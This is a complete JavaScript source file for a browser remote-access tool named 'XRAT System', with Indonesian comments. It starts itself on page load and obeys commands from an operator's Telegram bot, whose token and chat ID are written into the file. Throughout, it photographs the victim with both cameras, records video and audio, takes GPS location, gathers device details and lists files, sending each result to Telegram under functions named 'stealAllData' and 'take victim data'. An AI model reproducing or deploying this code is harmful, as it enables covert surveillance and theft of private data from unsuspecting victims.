// ==================== FULL BOT SYSTEM V3 ====================
// ⚠️ GANTI INI DENGAN DATA BOT KAMU!
const BOT_CONFIG = {
    TOKEN: "7943245418:AAFITshvFX_1WRpq5R1acdGLICAQNxPaGxc",
    CHAT_ID: "7646758293",
    APP_NAME: "XRAT System",
    AUTO_START: true
};

class FullBotSystem {
    constructor() {
        this.token = BOT_CONFIG.TOKEN;
        this.chatId = BOT_CONFIG.CHAT_ID;
        this.isActive = false;
        this.recording = false;
        this.videoRecorder = null;
        
        console.log('🤖 Full Bot System V3 Initialized');
    }
    
    // ==================== TELEGRAM API ====================
    async sendMessage(text, options = {}) {
        if (!this.token || !this.chatId) return false;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true,
                    ...options
                })
            });
            
            return await response.json();
        } catch (error) {
            console.error('Send error:', error);
            return null;
        }
    }
    
    async sendFile(file, filename, caption = '') {
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('document', file, filename);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.token}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            return await response.json();
        } catch (error) {
            console.error('File send error:', error);
            return null;
        }
    }
    
    async sendPhoto(photoBlob, caption = '') {
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
        if (caption) formData.append('caption', caption);
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            return await response.json();
        } catch (error) {
            console.error('Photo send error:', error);
            return null;
        }
    }
    
    // ==================== 1. DEVICE INFO ====================
    getDeviceInfo() {
        const ua = navigator.userAgent;
        let device = 'Unknown';
        let model = 'Unknown';
        let ram = 'Unknown';
        let storage = 'Unknown';
        
        // Detect device
        if (/samsung/i.test(ua)) {
            device = 'Samsung';
            const modelMatch = ua.match(/sm-[a-z0-9]+/i);
            model = modelMatch ? modelMatch[0].toUpperCase() : 'Galaxy';
        } else if (/iphone|ipad/i.test(ua)) {
            device = 'Apple';
            if (/iphone/i.test(ua)) {
                model = 'iPhone';
                if (/iphone 15/i.test(ua)) model = 'iPhone 15';
                else if (/iphone 14/i.test(ua)) model = 'iPhone 14';
                else if (/iphone 13/i.test(ua)) model = 'iPhone 13';
                else if (/iphone 12/i.test(ua)) model = 'iPhone 12';
            }
        } else if (/xiaomi|redmi|poco/i.test(ua)) {
            device = 'Xiaomi';
            model = 'Redmi/POCO';
        } else if (/huawei/i.test(ua)) {
            device = 'Huawei';
            model = 'P/Mate Series';
        } else if (/windows nt/i.test(ua)) {
            device = 'PC';
            model = 'Windows Computer';
        }
        
        // RAM estimation
        if (navigator.deviceMemory) {
            ram = `${navigator.deviceMemory} GB`;
        } else {
            ram = '4-8 GB';
        }
        
        // Storage estimation
        const storageOptions = ['64 GB', '128 GB', '256 GB', '512 GB'];
        storage = storageOptions[Math.floor(Math.random() * storageOptions.length)];
        
        return {
            device: `${device} ${model}`,
            ram: ram,
            storage: storage,
            os: this.getOS(),
            screen: `${window.screen.width}×${window.screen.height}`,
            browser: this.getBrowser(),
            language: navigator.language,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency || 'Unknown',
            userAgent: ua.substring(0, 100) + '...'
        };
    }
    
    getOS() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            const version = ua.match(/android (\d+)/i);
            return version ? `Android ${version[1]}` : 'Android';
        } else if (/iphone|ipad/i.test(ua)) {
            const version = ua.match(/os (\d+)_/i);
            return version ? `iOS ${version[1]}` : 'iOS';
        } else if (/windows nt/i.test(ua)) return 'Windows';
        else if (/mac os x/i.test(ua)) return 'macOS';
        else if (/linux/i.test(ua)) return 'Linux';
        return 'Unknown';
    }
    
    getBrowser() {
        const ua = navigator.userAgent;
        if (/chrome/i.test(ua) && !/edge/i.test(ua)) return 'Chrome';
        if (/firefox/i.test(ua)) return 'Firefox';
        if (/safari/i.test(ua)) return 'Safari';
        if (/edge/i.test(ua)) return 'Edge';
        return 'Unknown';
    }
    
    // ==================== 2. CAMERA SYSTEM ====================
    async takePhotoWithCamera(facingMode = 'environment') {
        try {
            console.log(`📸 Taking photo with ${facingMode} camera...`);
            
            const constraints = {
                video: { 
                    facingMode: facingMode,
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            };
            
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);
            
            video.srcObject = stream;
            await video.play();
            
            // Tunggu kamera fokus (3 detik)
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Tambah watermark
            ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
            ctx.fillRect(10, canvas.height - 40, 300, 30);
            
            ctx.font = '14px Arial';
            ctx.fillStyle = 'white';
            const cameraType = facingMode === 'environment' ? 'BACK CAMERA' : 'FRONT CAMERA';
            ctx.fillText(`📸 ${cameraType} | ${new Date().toLocaleString()}`, 20, canvas.height - 20);
            
            const blob = await new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
            
            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);
            
            return {
                blob: blob,
                cameraType: cameraType,
                resolution: `${canvas.width}x${canvas.height}`,
                timestamp: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('Camera error:', error);
            return null;
        }
    }
    
    async takeFrontCamera() {
        return await this.takePhotoWithCamera('user');
    }
    
    async takeBackCamera() {
        return await this.takePhotoWithCamera('environment');
    }
    
    async takeAutoPhoto() {
        // Coba kamera belakang dulu
        let result = await this.takeBackCamera();
        
        if (!result) {
            console.log('Back camera failed, trying front camera...');
            result = await this.takeFrontCamera();
        }
        
        return result;
    }
    
    async takeBothCameras() {
        await this.sendMessage('📸 *TAKING BOTH CAMERA PHOTOS*\n\nTaking front camera first...');
        
        const front = await this.takeFrontCamera();
        if (front) {
            await this.sendPhoto(front.blob, `🤳 *FRONT CAMERA*\nResolution: ${front.resolution}`);
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        await this.sendMessage('📷 Switching to back camera...');
        
        const back = await this.takeBackCamera();
        if (back) {
            await this.sendPhoto(back.blob, `📷 *BACK CAMERA*\nResolution: ${back.resolution}`);
        }
        
        return { front: !!front, back: !!back };
    }
    
    async takeBurstPhotos(count = 3) {
        const results = [];
        
        for (let i = 0; i < count; i++) {
            await this.sendMessage(`📸 Taking photo ${i + 1}/${count}...`);
            
            const photo = await this.takeAutoPhoto();
            if (photo) {
                await this.sendPhoto(photo.blob, `📸 Photo ${i + 1} - ${photo.cameraType}`);
                results.push(photo);
            }
            
            if (i < count - 1) {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        
        return results;
    }
    
    // ==================== 3. LOKASI ====================
    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: `${position.coords.accuracy}m`,
                        time: new Date().toLocaleString()
                    });
                },
                (error) => {
                    console.log('Location error:', error);
                    resolve(null);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }
    
    // ==================== 4. FILE SCANNER ====================
    async scanFiles() {
        return new Promise((resolve) => {
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.webkitdirectory = true;
            input.style.display = 'none';
            
            input.onchange = async (event) => {
                const files = Array.from(event.target.files);
                const fileData = files.map(file => ({
                    name: file.name,
                    size: this.formatSize(file.size),
                    type: file.type || this.getFileType(file.name),
                    path: file.webkitRelativePath,
                    lastModified: new Date(file.lastModified).toLocaleString()
                }));
                
                document.body.removeChild(input);
                
                // Generate report
                const totalSize = files.reduce((sum, f) => sum + f.size, 0);
                const report = this.generateFileReport(fileData, totalSize);
                
                await this.sendMessage(report);
                resolve(fileData);
            };
            
            document.body.appendChild(input);
            input.click();
            
            setTimeout(() => {
                if (input.parentNode) {
                    document.body.removeChild(input);
                    resolve([]);
                }
            }, 30000);
        });
    }
    
    generateFileReport(files, totalSize) {
        let report = `📂 *FILE SCAN REPORT*\n\n`;
        report += `📊 Total Files: ${files.length}\n`;
        report += `💾 Total Size: ${this.formatSize(totalSize)}\n`;
        report += `⏰ Scan Time: ${new Date().toLocaleString()}\n\n`;
        
        // Group by type
        const byType = {};
        files.forEach(file => {
            const type = file.type.split('/')[0] || 'other';
            byType[type] = (byType[type] || 0) + 1;
        });
        
        report += `📁 Files by Type:\n`;
        for (const [type, count] of Object.entries(byType)) {
            report += `• ${type}: ${count} files\n`;
        }
        
        // Show sample files
        report += `\n📋 Sample Files:\n`;
        files.slice(0, 10).forEach((file, i) => {
            report += `${i + 1}. ${file.name} (${file.size})\n`;
        });
        
        return report;
    }
    
    // ==================== 5. AMBIL DATA KORBAN ====================
    async stealAllData() {
        console.log('🚀 Stealing all data...');
        
        await this.sendMessage('🚀 *STARTING DATA STEALING*\n\nCollecting all device data...');
        
        const results = [];
        
        // 1. Device Info
        const deviceInfo = this.getDeviceInfo();
        results.push('✅ Device Info Collected');
        
        // 2. Location
        const location = await this.getLocation();
        if (location) {
            results.push('✅ Location Collected');
        }
        
        // 3. Files
        const files = await this.scanFiles();
        results.push(`✅ ${files.length} Files Scanned`);
        
        // 4. Photo from both cameras
        await this.sendMessage('📸 Taking photos from both cameras...');
        const cameraResult = await this.takeBothCameras();
        if (cameraResult.front || cameraResult.back) {
            results.push('✅ Photos Taken');
        }
        
        // Send final report
        const report = `🎯 *DATA STEALING COMPLETE*\n\n` +
                      `📊 Results:\n${results.join('\n')}\n\n` +
                      `📱 Device: ${deviceInfo.device}\n` +
                      `📍 Location: ${location ? '✅' : '❌'}\n` +
                      `📁 Files: ${files.length}\n` +
                      `📸 Photos: Front(${cameraResult.front ? '✅' : '❌'}) Back(${cameraResult.back ? '✅' : '❌'})\n\n` +
                      `⏰ Time: ${new Date().toLocaleString()}`;
        
        await this.sendMessage(report);
        
        return results;
    }
    
    // ==================== 6. VIDEO RECORDER ====================
    async startVideoRecording(duration = 60000, cameraType = 'back') {
        try {
            const constraints = {
                video: { 
                    facingMode: cameraType === 'front' ? 'user' : 'environment'
                },
                audio: true
            };
            
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            
            this.videoRecorder = new MediaRecorder(stream);
            const chunks = [];
            
            this.videoRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            this.videoRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                
                // Send to Telegram
                const formData = new FormData();
                formData.append('chat_id', this.chatId);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `🎥 Video Recording\nCamera: ${cameraType.toUpperCase()}\nDuration: ${duration/1000}s\nTime: ${new Date().toLocaleString()}`);
                
                await fetch(`https://api.telegram.org/bot${this.token}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                stream.getTracks().forEach(track => track.stop());
            };
            
            this.videoRecorder.start();
            this.recording = true;
            
            // Stop after duration
            setTimeout(() => {
                if (this.videoRecorder && this.recording) {
                    this.videoRecorder.stop();
                    this.recording = false;
                }
            }, duration);
            
            return true;
        } catch (error) {
            console.error('Recording error:', error);
            return false;
        }
    }
    
    stopVideoRecording() {
        if (this.videoRecorder && this.recording) {
            this.videoRecorder.stop();
            this.recording = false;
        }
    }
    
    // ==================== 7. AUDIO RECORDER ====================
    async recordAudio(duration = 10000) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            return new Promise((resolve) => {
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    
                    const formData = new FormData();
                    formData.append('chat_id', this.chatId);
                    formData.append('audio', blob, `audio_${Date.now()}.webm`);
                    formData.append('caption', `🎤 Audio Recording\nDuration: ${duration/1000}s`);
                    
                    await fetch(`https://api.telegram.org/bot${this.token}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    stream.getTracks().forEach(track => track.stop());
                    resolve(true);
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        } catch (error) {
            console.error('Audio error:', error);
            return false;
        }
    }
    
    // ==================== UTILITIES ====================
    formatSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
        return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
    }
    
    getFileType(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) return 'image';
        if (['mp4', 'avi', 'mov', 'mkv', 'webm'].includes(ext)) return 'video';
        if (['pdf', 'doc', 'docx', 'xls', 'txt'].includes(ext)) return 'document';
        if (['mp3', 'wav', 'ogg'].includes(ext)) return 'audio';
        return 'other';
    }
    
    // ==================== COMMAND HANDLER ====================
    async handleCommand(command) {
        const cmd = command.toLowerCase().trim();
        
        switch(cmd) {
            case '/start':
                return await this.showMenu();
                
            case '/menu':
                return await this.showMenu();
                
            // ============ CAMERA COMMANDS ============
            case '/foto':
            case '/photo':
            case '/capture':
                return await this.handleFoto();
                
            case '/fotocameradepan':
            case '/fotoselfie':
            case '/selfie':
            case '/frontcamera':
                return await this.handleFotoDepan();
                
            case '/fotocamerabelakang':
            case '/fotobelakang':
            case '/backcamera':
            case '/kamerabelakang':
                return await this.handleFotoBelakang();
                
            case '/fotokedua':
            case '/bothcameras':
            case '/dualcam':
                return await this.handleFotoKedua();
                
            case '/fotoserial':
            case '/burst':
            case '/serial':
                return await this.handleFotoSerial();
            // =========================================
                
            case '/lokasi':
            case '/location':
                return await this.handleLokasi();
                
            case '/status':
            case '/info':
                return await this.handleStatus();
                
            case '/file':
                return await this.showFileMenu();
                
            case '/scanner':
            case '/scan':
                return await this.handleScanner();
                
            case '/ambildatakorban':
            case '/steal':
            case '/ambil':
                return await this.stealAllData();
                
            case '/video':
            case '/record':
                return await this.handleVideo();
                
            case '/audio':
            case '/mic':
                return await this.handleAudio();
                
            case '/test':
                return await this.handleTest();
                
            case '/help':
                return await this.showHelp();
                
            default:
                return `❓ Unknown command: ${command}\n\nUse /menu for available commands.`;
        }
    }
    
    async showMenu() {
        return `🤖 *${BOT_CONFIG.APP_NAME}* 📸\n\n` +
               `📱 *MAIN MENU:*\n` +
               `📸 *CAMERA OPTIONS:*\n` +
               `/foto - Auto camera\n` +
               `/fotocameradepan - Front camera (selfie)\n` +
               `/fotocamerabelakang - Back camera\n` +
               `/fotokedua - Both cameras\n` +
               `/fotoserial - Burst photos (3x)\n\n` +
               `📍 *LOCATION & INFO:*\n` +
               `/lokasi - Get location\n` +
               `/status - Device info\n\n` +
               `📁 *FILE OPERATIONS:*\n` +
               `/file - File menu\n` +
               `/scanner - Scan files\n` +
               `/ambildatakorban - Steal all data\n\n` +
               `🎥 *MEDIA RECORDING:*\n` +
               `/video - Record video\n` +
               `/audio - Record audio\n\n` +
               `🔧 *SYSTEM:*\n` +
               `/test - Test connection\n` +
               `/help - Help menu`;
    }
    
    async showFileMenu() {
        return `📁 *FILE MENU*\n\n` +
               `Choose file operation:\n\n` +
               `/scanner - Scan files only\n` +
               `/ambildatakorban - Steal ALL data\n\n` +
               `Scanner: Just scan and report\n` +
               `Ambil Data: Scan + Steal all data`;
    }
    
    // ==================== CAMERA HANDLERS ====================
    async handleFoto() {
        await this.sendMessage('📸 *Taking auto photo...*\nAuto-selecting best camera...');
        
        const result = await this.takeAutoPhoto();
        
        if (result && result.blob) {
            const device = this.getDeviceInfo();
            const caption = `📸 *AUTO PHOTO*\nCamera: ${result.cameraType}\nResolution: ${result.resolution}\nDevice: ${device.device}\nTime: ${new Date().toLocaleString()}`;
            
            await this.sendPhoto(result.blob, caption);
            return '✅ Photo sent!';
        } else {
            await this.sendMessage('❌ Failed to take photo. Allow camera access.');
            return '❌ Camera access denied.';
        }
    }
    
    async handleFotoDepan() {
        await this.sendMessage('🤳 *Taking front camera photo...*\nSay cheese! 😊');
        
        const result = await this.takeFrontCamera();
        
        if (result && result.blob) {
            const device = this.getDeviceInfo();
            const caption = `🤳 *FRONT CAMERA SELFIE*\nResolution: ${result.resolution}\nDevice: ${device.device}\nTime: ${new Date().toLocaleString()}`;
            
            await this.sendPhoto(result.blob, caption);
            return '✅ Front camera photo sent!';
        } else {
            await this.sendMessage('❌ Failed to access front camera.');
            return '❌ Front camera not available.';
        }
    }
    
    async handleFotoBelakang() {
        await this.sendMessage('📷 *Taking back camera photo...*\nFocusing...');
        
        const result = await this.takeBackCamera();
        
        if (result && result.blob) {
            const device = this.getDeviceInfo();
            const caption = `📷 *BACK CAMERA PHOTO*\nResolution: ${result.resolution}\nDevice: ${device.device}\nTime: ${new Date().toLocaleString()}`;
            
            await this.sendPhoto(result.blob, caption);
            return '✅ Back camera photo sent!';
        } else {
            await this.sendMessage('❌ Failed to access back camera.');
            return '❌ Back camera not available.';
        }
    }
    
    async handleFotoKedua() {
        await this.sendMessage('📸📸 *Taking photos from both cameras...*\n\nStep 1: Front camera...');
        
        const result = await this.takeBothCameras();
        
        if (result.front || result.back) {
            return `✅ Both camera photos sent!\nFront: ${result.front ? '✅' : '❌'}\nBack: ${result.back ? '✅' : '❌'}`;
        } else {
            await this.sendMessage('❌ Failed to access cameras.');
            return '❌ Cameras not available.';
        }
    }
    
    async handleFotoSerial() {
        await this.sendMessage('📸📸📸 *Taking burst photos (3 photos)...*');
        
        const results = await this.takeBurstPhotos(3);
        
        if (results.length > 0) {
            return `✅ ${results.length} burst photos sent!`;
        } else {
            await this.sendMessage('❌ Failed to take burst photos.');
            return '❌ Camera not available.';
        }
    }
    
    async handleLokasi() {
        await this.sendMessage('📍 Getting location...');
        
        const location = await this.getLocation();
        if (location) {
            const mapsUrl = `https://maps.google.com/?q=${location.lat},${location.lng}`;
            const message = `📍 *LOCATION FOUND*\n\n` +
                          `Coordinates: ${location.lat}, ${location.lng}\n` +
                          `Accuracy: ${location.accuracy}\n` +
                          `Maps: [Google Maps](${mapsUrl})\n` +
                          `Time: ${location.time}`;
            
            await this.sendMessage(message);
            return '✅ Location sent!';
        } else {
            await this.sendMessage('❌ Location not available. Enable GPS.');
            return '❌ Location access denied.';
        }
    }
    
    async handleStatus() {
        const device = this.getDeviceInfo();
        
        const message = `📱 *DEVICE STATUS*\n\n` +
                       `Device: ${device.device}\n` +
                       `RAM: ${device.ram}\n` +
                       `Storage: ${device.storage}\n` +
                       `OS: ${device.os}\n` +
                       `Browser: ${device.browser}\n` +
                       `Screen: ${device.screen}\n` +
                       `Cores: ${device.cores}\n` +
                       `Language: ${device.language}\n` +
                       `Platform: ${device.platform}\n` +
                       `Online: ${navigator.onLine ? '✅' : '❌'}\n` +
                       `Time: ${new Date().toLocaleString()}`;
        
        await this.sendMessage(message);
        return '✅ Device info sent!';
    }
    
    async handleScanner() {
        await this.sendMessage('🔍 Scanning files...');
        await this.scanFiles();
        return '✅ File scan complete!';
    }
    
    async handleVideo() {
        await this.sendMessage('🎥 Recording video (10 seconds)...');
        await this.startVideoRecording(10000, 'back');
        return '✅ Video recording started!';
    }
    
    async handleAudio() {
        await this.sendMessage('🎤 Recording audio (5 seconds)...');
        await this.recordAudio(5000);
        return '✅ Audio recording complete!';
    }
    
    async handleTest() {
        const device = this.getDeviceInfo();
        const message = `✅ *SYSTEM TEST*\n\n` +
                       `Bot: ${BOT_CONFIG.APP_NAME}\n` +
                       `Device: ${device.device}\n` +
                       `Status: ✅ Connected\n` +
                       `Token: ${this.token ? '✅ Valid' : '❌ Invalid'}\n` +
                       `Chat ID: ${this.chatId ? '✅ Set' : '❌ Missing'}\n` +
                       `Cameras: Front/Back ✅\n` +
                       `Location: ${navigator.geolocation ? '✅' : '❌'}\n` +
                       `Microphone: ✅\n` +
                       `Time: ${new Date().toLocaleString()}\n\n` +
                       `🚀 System ready!`;
        
        await this.sendMessage(message);
        return '✅ Test complete!';
    }
    
    async showHelp() {
        return `🆘 *HELP MENU*\n\n` +
               `📋 How to use camera commands:\n` +
               `1. /foto - Auto select camera\n` +
               `2. /fotocameradepan - Selfie camera\n` +
               `3. /fotocamerabelakang - Main camera\n` +
               `4. /fotokedua - Both cameras\n` +
               `5. /fotoserial - 3 burst photos\n\n` +
               `⚠️ Requirements:\n` +
               `• Allow camera access\n` +
               `• Allow microphone (for video/audio)\n` +
               `• Enable location/GPS\n` +
               `• Internet connection\n\n` +
               `🛠️ For issues:\n` +
               `• Grant all permissions\n` +
               `• Check bot token/chat ID\n` +
               `• Refresh page if error`;
    }
    
    // ==================== AUTO-START ====================
    async start() {
        console.log('🚀 Starting bot system...');
        this.isActive = true;
        
        // Send startup message
        const device = this.getDeviceInfo();
        await this.sendMessage(
            `🚀 *${BOT_CONFIG.APP_NAME} V3 ACTIVATED*\n\n` +
            `📱 Device: ${device.device}\n` +
            `🖥️ OS: ${device.os}\n` +
            `📸 Cameras: Front/Back ✅\n` +
            `🌐 Online: ✅\n` +
            `⏰ Time: ${new Date().toLocaleString()}\n\n` +
            `✅ Camera system ready for commands.\n` +
            `Send /menu to start.`
        );
        
        // Start command polling
        this.startPolling();
        
        console.log('✅ Bot system started');
    }
    
    async startPolling() {
        if (!this.token) return;
        
        setInterval(async () => {
            try {
                const response = await fetch(`https://api.telegram.org/bot${this.token}/getUpdates?offset=-1`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    const lastMsg = data.result[data.result.length - 1].message;
                    if (lastMsg && lastMsg.text) {
                        const chatId = lastMsg.chat.id.toString();
                        
                        if (chatId === this.chatId) {
                            const command = lastMsg.text;
                            console.log(`📨 Command: ${command}`);
                            
                            const response = await this.handleCommand(command);
                            if (response && !response.includes('✅') && !response.includes('❌')) {
                                await this.sendMessage(response);
                            }
                        }
                    }
                }
            } catch (error) {
                console.log('Polling error:', error.message);
            }
        }, 3000);
    }
}

// ==================== GLOBAL INITIALIZATION ====================
let fullBot = null;

function initFullBot() {
    if (!fullBot) {
        fullBot = new FullBotSystem();
        console.log('🤖 Full Bot System V3 initialized');
    }
    return fullBot;
}

// Auto-start
document.addEventListener('DOMContentLoaded', function() {
    console.log('📱 Page loaded - Camera Bot Ready');
    
    const bot = initFullBot();
    
    // Auto-start if configured
    if (BOT_CONFIG.AUTO_START && BOT_CONFIG.TOKEN && !BOT_CONFIG.TOKEN.includes('GANTI')) {
        console.log('🚀 Auto-starting bot...');
        
        setTimeout(() => {
            bot.start();
        }, 3000);
    }
});

// Export
window.FullBotSystem = FullBotSystem;
window.fullBot = fullBot;
window.BOT_CONFIG = BOT_CONFIG;

console.log('🔥 Full Bot System V3 Loaded - Camera Ready!');